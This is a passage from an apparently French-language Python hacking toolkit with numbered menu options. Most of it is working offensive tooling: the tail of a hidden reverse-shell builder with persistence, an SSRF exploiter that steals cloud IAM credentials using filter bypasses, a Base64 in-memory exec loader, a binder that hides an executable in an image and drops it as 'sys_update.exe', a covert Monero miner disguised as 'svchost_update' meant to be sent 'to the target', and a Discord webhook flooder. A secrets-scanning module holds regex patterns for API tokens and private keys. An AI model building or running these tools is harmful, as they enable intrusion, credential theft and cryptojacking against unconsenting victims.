                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_revshell")
    spec_dir = _safe_workdir()

    print(f"\n{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean", "--noconfirm",
        "--name", "revshell",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]

    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "revshell.exe")
    print(f"\n{GREEN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{GREEN}{BOLD}   REVERSE SHELL COMPILE{RESET}")
    print(f"{GREEN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")
    print(f"  {GREEN}Exe     : {WHITE}{exe}{RESET}")
    print(f"  {GREEN}LHOST   : {WHITE}{lhost}{RESET}")
    print(f"  {GREEN}LPORT   : {WHITE}{lport}{RESET}")
    print(f"  {GREEN}Shell   : {WHITE}{shell_cmd}{RESET}")
    print(f"  {GREEN}Persist : {WHITE}{'oui' if persist else 'non'}{RESET}")
    print()
    print(f"{CYAN}   POUR ECOUTER :{RESET}")
    print(f"  {WHITE}nc -lvnp {lport}{RESET}   {GRAY}(Linux/macOS){RESET}")
    print(f"  {WHITE}ncat -lvnp {lport}{RESET}  {GRAY}(si nc casse){RESET}")
    print(f"  {WHITE}rlwrap nc -lvnp {lport}{RESET} {GRAY}(historique + fleches){RESET}")

    for p in [tmp, os.path.join(spec_dir, "revshell.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass

    pause()


# ============================================================
#              OPTION 45 — GIT SECRETS SCANNER
# ============================================================
# Clone un repo Git (ou scanne un dossier) et cherche les fuites :
# cles AWS, tokens GitHub, cles privees RSA, mots de passe en dur,
# .env, etc. Detecte aussi les secrets dans l'historique des commits.
# ============================================================

def option_45():
    clear()
    banner()

    print(f"\n{CYAN}   [ GIT SECRETS SCANNER ]{RESET}\n")
    print(f"{GRAY}  Clone un repo ou scanne un dossier local et cherche les secrets fuites.{RESET}")
    print(f"{GRAY}  Detecte aussi les secrets dans l'historique Git.{RESET}\n")

    # --- Source ---
    print(f"{WHITE}{BOLD}-- Source --{RESET}\n")
    print(f"  {PINK}(1){RESET} Repo Git distant (clone)")
    print(f"  {PINK}(2){RESET} Dossier local")
    print()
    src_choice = input(f"{YELLOW}[?]{RESET} Choix (1-2, def 1) {RED}->{RESET} ").strip() or "1"

    if src_choice == "1":
        repo_url = input(f"{YELLOW}[?]{RESET} URL du repo (ex: https://github.com/user/repo) {RED}->{RESET} ").strip()
        if not repo_url:
            print(f"{RED}[!] URL vide.{RESET}")
            pause()
            return
        target_dir = os.path.join(_safe_workdir(), "git_scan_repo")
        if os.path.exists(target_dir):
            shutil.rmtree(target_dir, ignore_errors=True)
        print(f"{YELLOW}[*] Clone de {repo_url}...{RESET}")
        try:
            r = subprocess.run(["git", "clone", "--depth=100", repo_url, target_dir],
                               capture_output=True, text=True, timeout=300)
            if r.returncode != 0:
                print(f"{RED}[!] Echec clone : {r.stderr[-500:]}{RESET}")
                pause()
                return
            print(f"{GREEN}[+] Repo clone dans {target_dir}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Erreur clone : {e}{RESET}")
            pause()
            return
    else:
        target_dir = input(f"{YELLOW}[?]{RESET} Dossier local {RED}->{RESET} ").strip().strip('"').strip("'")
        if not target_dir or not os.path.isdir(target_dir):
            print(f"{RED}[!] Dossier introuvable.{RESET}")
            pause()
            return

    # --- Patterns de detection ---
    patterns = {
        "AWS Access Key": r"AKIA[0-9A-Z]{16}",
        "AWS Secret Key": r"aws(.{0,20})?['\"][0-9a-zA-Z/+]{40}['\"]",
        "GitHub Token (classic)": r"ghp_[0-9a-zA-Z]{36}",
        "GitHub Token (fine)": r"github_pat_[0-9a-zA-Z_]{82}",
        "GitLab Token": r"glpat-[0-9a-zA-Z\-_]{20}",
        "Slack Token": r"xox[baprs]-[0-9a-zA-Z\-]{10,}",
        "Stripe Live Key": r"sk_live_[0-9a-zA-Z]{24,}",
        "Stripe Test Key": r"sk_test_[0-9a-zA-Z]{24,}",
        "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
        "Twilio SID": r"AC[a-f0-9]{32}",
        "Twilio Auth Token": r"SK[a-f0-9]{32}",
        "Discord Webhook": r"https://discord(app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_\-]+",
        "Discord Bot Token": r"[MNO][A-Za-z0-9_\-]{23,}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,}",
        "Private Key (RSA)": r"-----BEGIN RSA PRIVATE KEY-----",
        "Private Key (EC)": r"-----BEGIN EC PRIVATE KEY-----",
        "Private Key (OpenSSH)": r"-----BEGIN OPENSSH PRIVATE KEY-----",
        "Private Key (PGP)": r"-----BEGIN PGP PRIVATE KEY BLOCK-----",
        "JWT": r"eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}",
        "Bearer Token": r"[Bb]earer\s+[A-Za-z0-9_\-\.=]{20,}",
        "Heroku API Key": r"heroku[a-z0-9]{32}",
        "Mailchimp Key": r"[0-9a-f]{32}-us[0-9]{1,2}",
        "SendGrid Key": r"SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}",
        "Password in URL": r"[a-zA-Z]{3,10}://[^/\s:@]{3,20}:[^/\s:@]{3,20}@",
        "Generic Secret (env)": r"(?i)(api[_-]?key|secret|passwd|password|token|auth)[\s]*[=:]\s*['\"][^'\"]{8,}['\"]",
    }

    compiled = {name: re.compile(pattern, re.MULTILINE) for name, pattern in patterns.items()}

    # --- Extensions / fichiers a ignorer ---
    skip_dirs = {".git", "node_modules", "__pycache__", ".venv", "venv", "env",
                 "dist", "build", "target", ".idea", ".vscode", "vendor"}
    skip_exts = {".png", ".jpg", ".jpeg", ".gif", ".bmp", ".ico", ".svg",
                 ".woff", ".woff2", ".ttf", ".eot", ".mp3", ".mp4", ".avi",
                 ".zip", ".tar", ".gz", ".rar", ".7z", ".pdf", ".exe", ".dll",
                 ".so", ".dylib", ".pyc", ".class", ".jar", ".lock"}
    max_size = 2 * 1024 * 1024  # 2 MB

    findings = []
    scan_lock = threading.Lock()
    files_scanned = [0]

    # --- Scan des fichiers ---
    print(f"\n{YELLOW}[*] Scan des fichiers...{RESET}\n")

    for root, dirs, files in os.walk(target_dir):
        dirs[:] = [d for d in dirs if d not in skip_dirs]
        for fname in files:
            ext = os.path.splitext(fname)[1].lower()
            if ext in skip_exts:
                continue
            fpath = os.path.join(root, fname)
            try:
                size = os.path.getsize(fpath)
                if size > max_size:
                    continue
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
            except Exception:
                continue

            files_scanned[0] += 1
            if files_scanned[0] % 50 == 0:
                sys.stdout.write(f"\r{GRAY}[*] {files_scanned[0]} fichiers scannes...{RESET}")
                sys.stdout.flush()

            rel_path = os.path.relpath(fpath, target_dir)
            for name, regex in compiled.items():
                for match in regex.finditer(content):
                    line_no = content[:match.start()].count("\n") + 1
                    snippet = match.group(0)[:100]
                    with scan_lock:
                        findings.append({
                            "file": rel_path,
                            "line": line_no,
                            "type": name,
                            "match": snippet,
                            "source": "working_tree",
                        })

    print(f"\n{GREEN}[+] {files_scanned[0]} fichiers scannes dans l'arbre de travail.{RESET}")

    # --- Scan de l'historique Git ---
    if os.path.isdir(os.path.join(target_dir, ".git")):
        print(f"\n{YELLOW}[*] Scan de l'historique Git (100 derniers commits)...{RESET}\n")
        try:
            # Recupere les objets de tous les commits
            r = subprocess.run(["git", "log", "--all", "--pretty=format:%H", "-n", "100"],
                               cwd=target_dir, capture_output=True, text=True, timeout=60)
            commits = r.stdout.strip().split("\n") if r.stdout.strip() else []

            for i, commit in enumerate(commits):
                if not commit:
                    continue
                sys.stdout.write(f"\r{GRAY}[*] Commit {i+1}/{len(commits)}...{RESET}")
                sys.stdout.flush()
                try:
                    r2 = subprocess.run(["git", "show", "--format=", commit],
                                        cwd=target_dir, capture_output=True, text=True,
                                        timeout=30, errors="ignore")
                    content = r2.stdout
                    if not content:
                        continue
                    for name, regex in compiled.items():
                        for match in regex.finditer(content):
                            snippet = match.group(0)[:100]
                            with scan_lock:
                                findings.append({
                                    "file": f"commit:{commit[:8]}",
                                    "line": 0,
                                    "type": name,
                                    "match": snippet,
                                    "source": "git_history",
                                })
                except Exception:
                    pass
            print(f"\n{GREEN}[+] Historique scanne : {len(commits)} commits.{RESET}")
        except Exception as e:
            print(f"{YELLOW}[!] Erreur scan git : {e}{RESET}")

    # --- Resultats ---
    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   SECRETS TROUVES — {os.path.basename(target_dir)}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if findings:
        # Grouper par type
        by_type = {}
        for f in findings:
            by_type.setdefault(f["type"], []).append(f)

        print(f"{PINK}{BOLD}   {len(findings)} SECRETS TROUVES ({len(by_type)} types){RESET}\n")

        for type_name, items in sorted(by_type.items(), key=lambda x: -len(x[1])):
            print(f"{PINK}[+]{RESET} {WHITE}{BOLD}{type_name}{RESET} {GRAY}({len(items)}){RESET}")
            for item in items[:5]:
                loc = f"{item['file']}:{item['line']}" if item['line'] else item['file']
                print(f"    {GRAY}└─ {loc}{RESET}")
                print(f"       {WHITE}{item['match'][:80]}{RESET}")
            if len(items) > 5:
                print(f"    {GRAY}└─ ... et {len(items) - 5} autres{RESET}")
            print()
    else:
        print(f"{GREEN}   Aucun secret detecte.{RESET}\n")

    # --- Export ---
    try:
        out_dir = Path(_safe_workdir()) / "Output" / "GitSecrets"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f"secrets_{int(time.time())}.txt"

        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Git Secrets Scanner\n")
            f.write(f"Target : {target_dir}\n")
            f.write(f"Date   : {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n\n")
            for item in findings:
                f.write(f"[{item['type']}] {item['source']}\n")
                f.write(f"  File : {item['file']}:{item['line']}\n")
                f.write(f"  Match: {item['match']}\n\n")

        print(f"{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    # --- Cleanup repo clone ---
    if src_choice == "1":
        try:
            shutil.rmtree(target_dir, ignore_errors=True)
        except Exception:
            pass

    pause()


# ============================================================
#              OPTION 46 — CLOUD METADATA SSRF EXPLOITER
# ============================================================
# Exploite une SSRF pour voler les credentials cloud (AWS, GCP, Azure,
# DigitalOcean). Contourne les filtres basiques par redirection DNS,
# IP decimal, IPv6 mappe, etc.
# ============================================================

def option_46():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    print(f"\n{CYAN}   [ CLOUD METADATA SSRF EXPLOITER ]{RESET}\n")
    print(f"{GRAY}  Exploite une SSRF pour voler les credentials cloud.{RESET}")
    print(f"{GRAY}  AWS / GCP / Azure / DigitalOcean + bypasses de filtres.{RESET}\n")

    # --- URL vulnerable ---
    url = input(f"{YELLOW}[?]{RESET} URL vulnerable (ex: http://site.com/fetch?url=) {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    if "=" not in url:
        print(f"{YELLOW}[!] L'URL doit contenir un parametre (ex: ?url=).{RESET}")
        pause()
        return

    print(f"{GRAY}[i] Le payload sera ajoute apres le '=' du dernier parametre.{RESET}")

    # --- Cloud provider ---
    print(f"\n{WHITE}{BOLD}-- Cloud Provider --{RESET}\n")
    print(f"  {PINK}(1){RESET} AWS")
    print(f"  {PINK}(2){RESET} Google Cloud")
    print(f"  {PINK}(3){RESET} Azure")
    print(f"  {PINK}(4){RESET} DigitalOcean")
    print(f"  {PINK}(5){RESET} Tous (test en cascade)")
    print()
    provider = input(f"{YELLOW}[?]{RESET} Choix (1-5, def 5) {RED}->{RESET} ").strip() or "5"

    # --- Webhook OOB ---
    webhook = input(f"\n{YELLOW}[?]{RESET} Webhook OOB (Interactsh, Webhook.site) (ENTREE pour skip) {RED}->{RESET} ").strip()

    # --- Endpoints par cloud ---
    endpoints = {
        "AWS": [
            ("IAM Credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("Instance ID", "http://169.254.169.254/latest/meta-data/instance-id"),
            ("User Data", "http://169.254.169.254/latest/user-data"),
            ("SSH Keys", "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"),
        ],
        "GCP": [
            ("Service Account Token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
            ("Project ID", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
            ("SSH Keys", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys"),
        ],
        "Azure": [
            ("Managed Identity Token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
            ("Instance Info", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            ("User Data", "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"),
        ],
        "DigitalOcean": [
            ("Metadata", "http://169.254.169.254/metadata/v1.json"),
            ("User Data", "http://169.254.169.254/metadata/v1/user-data"),
        ],
    }

    # --- Bypasses de filtres ---
    def bypass_variants(host, path):
        """Genere des variantes de l'URL pour contourner les filtres."""
        variants = [
            f"http://{host}{path}",
            f"http://{host}.nip.io{path}",
            f"http://{host}.sslip.io{path}",
            f"http://{host}.xip.io{path}",
            f"http://[{host}]{path}",
            f"http://0x7f000001{path}",
            f"http://2130706433{path}",
            f"http://017700000001{path}",
            f"http://127.1{path}",
            f"http://127.0.1{path}",
        ]
        return variants

    # --- Scan ---
    selected_providers = []
    if provider == "1":
        selected_providers = ["AWS"]
    elif provider == "2":
        selected_providers = ["GCP"]
    elif provider == "3":
        selected_providers = ["Azure"]
    elif provider == "4":
        selected_providers = ["DigitalOcean"]
    else:
        selected_providers = ["AWS", "GCP", "Azure", "DigitalOcean"]

    findings = []

    for prov in selected_providers:
        print(f"\n{CYAN}{BOLD}   [{prov}]{RESET}\n")
        for name, endpoint in endpoints[prov]:
            print(f"{GRAY}  Test {name}...{RESET}")

            parsed = urllib.parse.urlparse(endpoint)
            host = parsed.hostname
            path = parsed.path
            if parsed.query:
                path += "?" + parsed.query

            variants = bypass_variants(host, path)
            found = False

            for i, variant in enumerate(variants):
                test_url = url + urllib.parse.quote(variant, safe="")
                try:
                    headers = {"User-Agent": "Mozilla/5.0 Chrome/124"}
                    if prov == "GCP":
                        headers["Metadata-Flavor"] = "Google"
                    if prov == "Azure":
                        headers["Metadata"] = "true"

                    r = requests.get(test_url, headers=headers, timeout=10, verify=False)
                    body = r.text or ""

                    # Indicateurs de succes
                    success = False
                    if prov == "AWS" and ("AccessKeyId" in body or "SecretAccessKey" in body or "Token" in body):
                        success = True
                    elif prov == "GCP" and ("access_token" in body or "project-id" in body):
                        success = True
                    elif prov == "Azure" and ("access_token" in body or "vmId" in body):
                        success = True
                    elif prov == "DigitalOcean" and ("droplet_id" in body or "user-data" in body):
                        success = True

                    if success:
                        print(f"{PINK}    [+] {name} — VULNERABLE (variante {i+1}){RESET}")
                        print(f"{GRAY}        URL : {test_url}{RESET}")
                        print(f"{GRAY}        Extrait : {body[:300].strip()}{RESET}")
                        findings.append({
                            "provider": prov,
                            "name": name,
                            "url": test_url,
                            "body": body[:1000],
                        })
                        found = True
                        break
                except Exception:
                    pass

            if not found:
                print(f"{GRAY}    [-] {name}{RESET}")

    # --- OOB ping (SSRF aveugle) ---
    if webhook:
        print(f"\n{CYAN}{BOLD}   [ SSRF AVEUGLE (OOB) ]{RESET}\n")
        oob_url = f"{webhook}/ssrf_test"
        test_url = url + urllib.parse.quote(oob_url, safe="")
        try:
            requests.get(test_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False)
            print(f"{GREEN}[+]{RESET} Payload envoye. Verifie ton webhook.")
        except Exception:
            print(f"{YELLOW}[!] Erreur envoi OOB.{RESET}")

    # --- Resultats ---
    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   CLOUD METADATA — RESULTATS{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if findings:
        print(f"{PINK}{BOLD}   {len(findings)} FAILLES TROUVEES{RESET}\n")
        for f in findings:
            print(f"{PINK}[+]{RESET} {WHITE}{f['provider']} / {f['name']}{RESET}")
            print(f"    {GRAY}URL : {f['url']}{RESET}")
            print()
    else:
        print(f"{GREEN}   Aucune fuite cloud detectee.{RESET}")
        print(f"{GRAY}  Causes : pas de metadata cloud, filtres bloquants, ou SSRF non active.{RESET}")

    # --- Export ---
    try:
        out_dir = Path(_safe_workdir()) / "Output" / "CloudSSRF"
        out_dir.mkdir(parents=True, exist_ok=True)
        host = urllib.parse.urlparse(url).hostname or "target"
        safe_host = re.sub(r"[^\w\-.]", "_", host)[:40]
        out_file = out_dir / f"ssrf_{safe_host}_{int(time.time())}.txt"

        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Cloud Metadata SSRF — {url}\n")
            f.write(f"Date : {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n\n")
            for item in findings:
                f.write(f"[{item['provider']}] {item['name']}\n")
                f.write(f"  URL : {item['url']}\n")
                f.write(f"  Body:\n{item['body']}\n\n")

        print(f"\n{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()



def option_47():
    clear()
    banner()

    print(f"\n{CYAN}   [ PYTHON TO BASE64 COMPILER ]{RESET}\n")
    print(f"{GRAY}  Encode un script Python en Base64 et genere un loader autonome.{RESET}\n")

    # 1. Fichier source
    src_path = input(f"{YELLOW}[?]{RESET} Chemin du fichier .py a encoder {RED}->{RESET} ").strip().strip('"').strip("'")
    if not src_path or not os.path.isfile(src_path):
        print(f"{RED}[!] Fichier introuvable : {src_path}{RESET}")
        pause()
        return

    try:
        with open(src_path, "rb") as f:
            raw_bytes = f.read()
    except Exception as e:
        print(f"{RED}[!] Lecture impossible : {e}{RESET}")
        pause()
        return

    b64_bytes = base64.b64encode(raw_bytes)
    b64_string = b64_bytes.decode("utf-8")

    chunks = [b64_string[i:i+80] for i in range(0, len(b64_string), 80)]
    formatted_b64 = "\\n".join(chunks)

    loader_code = f'''# -*- coding: utf-8 -*-
# Loader auto-genere par mytool.py (Option 47)
import base64, sys

# Payload encode (Base64)
_DATA = """
{formatted_b64}
"""

def _run():
    try:
        # Nettoyage et decodage
        clean = _DATA.replace("\\n", "").replace(" ", "").replace("\\r", "")
        code_bytes = base64.b64decode(clean)
        
        # Execution en memoire (pas d'ecriture sur disque)
        exec(compile(code_bytes, "<b64_payload>", "exec"), globals())
    except Exception as e:
        pass

if __name__ == "__main__":
    _run()
'''

    base_name = os.path.splitext(os.path.basename(src_path))[0]
    out_name = f"{base_name}_b64.py"
    out_path = os.path.join(_safe_workdir(), out_name)

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(loader_code)

    print(f"\n{GREEN}[+] TERMINE{RESET}")
    print(f"  {GREEN}Source        : {WHITE}{src_path}{RESET}")
    print(f"  {GREEN}Loader genere : {WHITE}{out_path}{RESET}")
    print(f"  {GREEN}Taille B64    : {WHITE}{len(b64_string)} chars{RESET}")
    
    try:
        if os.name == "nt":
            os.startfile(_safe_workdir())
    except Exception:
        pass

    pause()



def option_48():
    clear()
    banner()

    print(f"\n{CYAN}   [ EXE TO IMAGE BINDER ]{RESET}\n")
    print(f"{GRAY}  Cache un fichier (exe, pdf, etc.) a la fin d'une image.{RESET}\n")

    exe_path = input(f"{YELLOW}[?]{RESET} Chemin du fichier a cacher {RED}->{RESET} ").strip().strip('"').strip("'")
    if not exe_path or not os.path.isfile(exe_path):
        print(f"{RED}[!] Fichier introuvable.{RESET}")
        pause()
        return

    img_path = input(f"{YELLOW}[?]{RESET} Image hote (.jpg/.png) (ENTREE = image par defaut) {RED}->{RESET} ").strip().strip('"').strip("'")
    
    if img_path and os.path.isfile(img_path):
        with open(img_path, "rb") as f:
            img_data = f.read()
        ext = os.path.splitext(img_path)[1].lower()
    else:
        print(f"{YELLOW}[*] Utilisation d'une image par defaut...{RESET}")
        default_b64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
        img_data = base64.b64decode(default_b64)
        ext = ".png"

    with open(exe_path, "rb") as f:
        exe_data = f.read()


    marker = b"__MAGIC_MARKER_START__"
    
    final_img_path = os.path.join(_safe_workdir(), f"payload_hidden{ext}")
    with open(final_img_path, "wb") as f:
        f.write(img_data)      
        f.write(marker)        
        f.write(exe_data)       

    print(f"{GREEN}[+] Image generee : {final_img_path}{RESET}")

    loader_code = f'''# -*- coding: utf-8 -*-
# Loader auto-genere par mytool.py (Option 48)
import os, sys, base64, tempfile, subprocess

IMG_B64 = """
{base64.b64encode(open(final_img_path, "rb").read()).decode("utf-8")}
"""

MARKER = b"__MAGIC_MARKER_START__"

def main():
    try:
        # Decodage de l'image
        img_data = base64.b64decode(IMG_B64.replace("\\n", "").replace(" ", ""))
        
        # Recherche du marqueur
        idx = img_data.find(MARKER)
        if idx == -1:
            return
            
        # Extraction du payload
        payload = img_data[idx + len(MARKER):]
        
        # Ecriture dans le temp
        temp_path = os.path.join(tempfile.gettempdir(), "sys_update.exe")
        with open(temp_path, "wb") as f:
            f.write(payload)
            
        # Execution
        subprocess.Popen([temp_path], shell=True)
        
        # (Optionnel) Supprimer le fichier apres execution
        # os.remove(temp_path)
    except Exception:
        pass

if __name__ == "__main__":
    main()
'''

    out_loader_path = os.path.join(_safe_workdir(), "image_loader.py")
    with open(out_loader_path, "w", encoding="utf-8") as f:
        f.write(loader_code)

    print(f"  {GREEN}Loader d'execution : {WHITE}{out_loader_path}{RESET}")
    print(f"{GRAY}[i] Tu peux envoyer l'image (elle s'affiche normalement){RESET}")
    print(f"{GRAY}    et le loader extrait l'exe en arriere-plan.{RESET}")

    try:
        if os.name == "nt":
            os.startfile(_safe_workdir())
    except Exception:
        pass

    pause()


def option_49():
    clear()
    banner()

    print(f"\n{CYAN}   [ CRYPTO MINER BUILDER ]{RESET}\n")
    print(f"{GRAY}  Genere un exe de minage (Monero) pour la cible.{RESET}\n")

    print(f"{WHITE}{BOLD}-- Configuration --{RESET}\n")
    wallet = input(f"{YELLOW}[?]{RESET} Adresse du Wallet XMR {RED}->{RESET} ").strip()
    if not wallet:
        print(f"{RED}[!] Wallet vide.{RESET}")
        pause()
        return

    pool = input(f"{YELLOW}[?]{RESET} Pool de minage (def: pool.minexmr.com:4444) {RED}->{RESET} ").strip() or "pool.minexmr.com:4444"
    
    try:
        threads = int(input(f"{YELLOW}[?]{RESET} Nombre de threads CPU (def 2) {RED}->{RESET} ").strip() or "2")
        if threads < 1:
            threads = 1
    except ValueError:
        threads = 2

    payload = f'''# -*- coding: utf-8 -*-
import os, sys, subprocess, tempfile, urllib.request, time, zipfile

WALLET = "{wallet}"
POOL = "{pool}"
THREADS = {threads}

XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-windows-x64.zip"

def download_and_run():
    temp_dir = tempfile.gettempdir()
    zip_path = os.path.join(temp_dir, "xmrig.zip")
    exe_path = os.path.join(temp_dir, "xmrig.exe")

    # Telechargement
    try:
        urllib.request.urlretrieve(XMRIG_URL, zip_path)
    except Exception:
        sys.exit(1)

    # Extraction
    try:
        with zipfile.ZipFile(zip_path, 'r') as z:
            for file in z.namelist():
                if file.endswith("xmrig.exe"):
                    z.extract(file, temp_dir)
                    extracted_path = os.path.join(temp_dir, file)
                    os.rename(extracted_path, exe_path)
                    break
    except Exception:
        sys.exit(1)

    # Lancement en arriere-plan
    try:
        cmd = [
            exe_path,
            "-o", POOL,
            "-u", WALLET,
            "-p", "x",
            "-t", str(THREADS),
            "--background"
        ]
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass

if __name__ == "__main__":
    download_and_run()
'''

    tmp_payload = _safe_tmp("_miner_payload.py")
    with open(tmp_payload, "w", encoding="utf-8") as f:
        f.write(payload)

    try:
        import PyInstaller  
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"], cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_miner")
    spec_dir = _safe_workdir()
    exe_name = "svchost_update"

    print(f"\n{YELLOW}[+] Compilation du mineur...{RESET}")

    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean", "--noconfirm",
        "--name", exe_name,
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--runtime-tmpdir", "%TEMP%",
        tmp_payload,
    ]

    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe_path = os.path.join(dist_dir, f"{exe_name}.exe")
    print(f"\n{GREEN}[+] TERMINE : {exe_path}{RESET}")
    print(f"  {GREEN}Wallet  : {WHITE}{wallet}{RESET}")
    print(f"  {GREEN}Pool    : {WHITE}{POOL}{RESET}")
    print(f"  {GREEN}Threads : {WHITE}{THREADS}{RESET}")
    print(f"{GRAY}[i] Envoie cet exe a la cible. Il telechargera XMRig et minera.{RESET}")

    for p in [tmp_payload, os.path.join(spec_dir, f"{exe_name}.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass

    pause()


def option_50():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ WEBHOOK FLOODER ]{RESET}\n")
    print(f"{GRAY}  Envoie N messages a un webhook Discord.{RESET}")
    print(f"{GRAY}  Utile pour tester la resilience d'un endpoint ou du load.{RESET}\n")

    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL {RED}->{RESET} ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook Discord invalide.{RESET}")
        pause()
        return

    msg = input(f"{YELLOW}[?]{RESET} Message a envoyer {RED}->{RESET} ").strip()
    if not msg:
        msg = "load-test"

    try:
        count = int(input(f"{YELLOW}[?]{RESET} Nombre de messages (def 100) {RED}->{RESET} ").strip() or "100")
        count = max(1, min(5000, count))
    except ValueError:
        count = 100

    try:
        delay = float(input(f"{YELLOW}[?]{RESET} Delai moyen entre messages (def 1.0s) {RED}->{RESET} ").strip() or "1.0")
        delay = max(0.0, delay)
    except ValueError:
        delay = 1.0

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"  {GREEN}Webhook : {WHITE}{webhook[:60]}...{RESET}")
    print(f"  {GREEN}Message : {WHITE}{msg[:50]}{RESET}")
    print(f"  {GREEN}Count   : {WHITE}{count}{RESET}")
    print(f"  {GREEN}Delay   : {WHITE}{delay}s +/- 30% jitter{RESET}")
    print()

    confirm = input(f"{YELLOW}[?]{RESET} Lancer ? (y/n) {RED}->{RESET} ").strip().lower()
    if confirm not in ("y", "yes", "o", "oui"):
        print(f"{YELLOW}[!] Annule.{RESET}")
        pause()
        return

    ok = 0
    fail = 0
    rl = 0
    start = time.time()

    try:
        for i in range(count):
            try:
                r = requests.post(webhook, json={"content": f"{msg} [{i+1}/{count}]"}, timeout=15)
                if r.status_code in (200, 204):
                    ok += 1
                elif r.status_code == 429:
                    rl += 1
                    try:
                        retry_after = r.json().get("retry_after", 5)
                        time.sleep(retry_after)
                    except Exception:
                        time.sleep(5)
                else:
                    fail += 1
            except Exception:
                fail += 1

            elapsed = time.time() - start
            rps = (i + 1) / elapsed if elapsed > 0 else 0
            sys.stdout.write(
                f"\r{GREEN}[+]{RESET} ok:{ok} {PINK}rl:{rl}{RESET} {RED}fail:{fail}{RESET} | "
                f"{CYAN}{(i+1)}/{count}{RESET} | {rps:.2f} msg/s   "
            )
            sys.stdout.flush()

            if i < count - 1 and delay > 0:
                jitter = delay * random.uniform(0.7, 1.3)
                time.sleep(jitter)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrompu.{RESET}")

    total_time = time.time() - start
    print(f"\n\n{GREEN}[+] Termine{RESET}")
    print(f"  {GREEN}Envoyes : {WHITE}{ok}{RESET}")
    print(f"  {PINK}Rate-limit : {WHITE}{rl}{RESET}")
    print(f"  {RED}Echecs   : {WHITE}{fail}{RESET}")
    print(f"  {GREEN}Duree    : {WHITE}{total_time:.2f}s{RESET}")
    pause()



def option_51():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ SUBDOMAIN ENUMERATOR ]{RESET}\n")
    print(f"{GRAY}  Sources passives : crt.sh, hackertarget, rapiddns.{RESET}")
    print(f"{GRAY}  Resolution DNS sur chaque candidat.{RESET}\n")

